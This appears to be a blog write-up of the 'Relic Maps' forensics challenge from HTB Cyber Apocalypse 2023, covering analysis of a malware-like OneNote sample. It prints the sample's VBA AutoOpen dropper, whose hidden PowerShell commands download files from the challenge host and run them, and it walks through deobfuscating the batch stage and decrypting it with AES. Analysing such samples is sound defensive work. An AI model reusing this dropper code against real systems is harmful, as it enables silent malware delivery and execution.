---
layout: post
title:  "HTB Cyber Apocalypse 2023 - (Forensics) Relic Maps"
date:   2023-03-23 15:00:05 +0300
categories: HTB_Cyber_Apocalypse_2023 CTF forensics 
summary: Writeup for the Relic Maps (Forensics, Medium) from HTB Cyber Apocalypse 2023. This challenge involved deobfuscating some batch scripting and some powershell. 
---


'Relic Maps' was one of the challenges in the 'Forensics' category at HTB's Cyber Apocalypse 2023. Its difficulty was "Medium".  
The challenge had a malware-like sample that had obfuscated batch script (.bat) code.

### Challenge description

We got a docker container running a web app and a reference to 'http://relicmaps.htb:/relicmaps.one'.  
relicmaps.htb can be replaced with the IP address of the container.  

### Entry point

We download the relicmaps.one and look at it by using 'strings'.
The only large string in there 

![Using strings]({{site.baseurl}}/assets/img/HTB_Cyber_Apocalypse_2023/relic_maps/strings.png){: .center-image}

There we see some VBA code that downloads another two files (topsecret-maps.one and window.bat)

{% highlight vba %}
Function WmiExec(cmdLine )
    Dim objConfig
    Dim objProcess
    Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
    Set objStartup = objWMIService.Get("Win32_ProcessStartup")
    Set objConfig = objStartup.SpawnInstance_
    objConfig.ShowWindow = 0
    Set objProcess = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
    WmiExec = dukpatek(objProcess, objConfig, cmdLine)
End Function
Private Function dukpatek(myObjP , myObjC , myCmdL )
    Dim procId
    dukpatek = myObjP.Create(myCmdL, Null, myObjC, procId)
End Function
Sub AutoOpen()
    ExecuteCmdAsync "cmd /c powershell Invoke-WebRequest -Uri http://relicmaps.htb/uploads/soft/topsecret-maps.one -OutFile $env:tmp\tsmap.one; Start-Process -Filepath $env:tmp\tsmap.one"
            ExecuteCmdAsync "cmd /c powershell Invoke-WebRequest -Uri http://relicmaps.htb/get/DdAbds/window.bat -OutFile $env:tmp\system32.bat; Start-Process -Filepath $env:tmp\system32.bat"
' Exec process using WScript.Shell (asynchronous)
Sub WscriptExec(cmdLine )
    CreateObject("WScript.Shell").Run cmdLine, 0
Sub ExecuteCmdAsync(targetPath )
    On Error Resume Next
    Err.Clear
    wimResult = WmiExec(targetPath)
    If Err.Number <> 0 Or wimResult <> 0 Then
        Err.Clear
        WscriptExec targetPath
    End If
    On Error Goto 0
window.resizeTo 0,0
{% endhighlight %}

topsecret-maps.one is not very interesting.  
However, window.bat seems to have some obfuscated code

The main things from window.bat are:
- A lot of substitutions being defined
- At the end of the file, the obfuscated code
- Somewhere in the middle, there's a comment containing a very long line (this will be relevant later)

### Deobfuscating the code

First, let's use those substitutions and deobfuscate the code.  
For this, I wrote a simple powershell script:

{% highlight python %}
def main():
        f = open('substitution.txt', 'r')
        substitutions = {}

        for line in f:
                line = line.strip()
                line = line[1:-1]

                fragments = line.split('=',1)
                substitutions[fragments[0]] = fragments[1]
        f.close()

        f = open('target_string.txt', 'r')

        for line in f:
                line = line.strip()
                for key in substitutions:
                        line = line.replace(key, substitutions[key])
                line = line.replace('%%', '')
                print(line)

        f.close()


if __name__=='__main__':
        main()
{% endhighlight %}

In substitutions.txt, I have a list of strings that look like this:
{% highlight bash %}
"ualBOGvshk=ws"
"PxzdwcSExs= /"
"ndjtYQuanY=po"
{% endhighlight %}

Those are taken right from the window.bat file.

![Deobfuscating bat code]({{site.baseurl}}/assets/img/HTB_Cyber_Apocalypse_2023/relic_maps/deobfuscating_bat.png){: .center-image}

After running that script, we can see that the payload is a powershell one-liner (a long one).

### Decrypting the payload

The powershell payload will look for that long comment in the middle of the .bat file, and then it will decrypt it using AES.  
We can obtain the IV and Key for AES by looking at that powershell line:
- IV = 2hn/J717js1MwdbbqMn7Lw==
- Key = 0xdfc6tTBkD+M0zxU7egGVErAsa/NtkVIHXeHDUiW20=

And we can use CyberChef to decrypt the next stage of this 'malware'
![Decrypting the payload]({{site.baseurl}}/assets/img/HTB_Cyber_Apocalypse_2023/relic_maps/decrypting.png){: .center-image}

### Finding the flag

I used the 'magic' module from CyberChef

![Using 'magic']({{site.baseurl}}/assets/img/HTB_Cyber_Apocalypse_2023/relic_maps/magic.png){: .center-image}

It seems like the payload is a zipped file, so we'll use the 'Gunzip' module on the decrypted output.

![Unzipping]({{site.baseurl}}/assets/img/HTB_Cyber_Apocalypse_2023/relic_maps/gunzip.png){: .center-image}

After using gunzip, we get a valid Windows binary (the MZ-PE characters can be easily seen)

![Looking for strings]({{site.baseurl}}/assets/img/HTB_Cyber_Apocalypse_2023/relic_maps/looking_for_strings.png){: .center-image}

I looked through the output and noticed some strings that might lead to the flag.  
Since they're unicode, I used the 'Remove null bytes' operation to make them more readable.

![Finding the flag]({{site.baseurl}}/assets/img/HTB_Cyber_Apocalypse_2023/relic_maps/relicmaps_flag.png){: .center-image}

And among those strings, I found the flag for this challenge.